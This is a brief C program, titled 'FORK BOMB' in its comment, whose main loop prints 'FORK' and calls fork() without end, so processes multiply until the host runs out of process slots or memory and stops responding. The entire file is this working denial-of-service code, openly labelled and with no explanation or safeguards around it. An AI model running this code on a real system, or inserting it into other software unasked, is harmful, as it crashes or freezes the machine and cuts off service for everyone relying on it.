/* 
 * FORK BOMB
*/
#include <stdio.h> 
#include <sys/types.h> 
#define EXIT_PROGRAM return 0
int main(void) 
{ 
    while(1) {  
        printf("FORK\n");
        fork();
    }     
    EXIT_PROGRAM;
}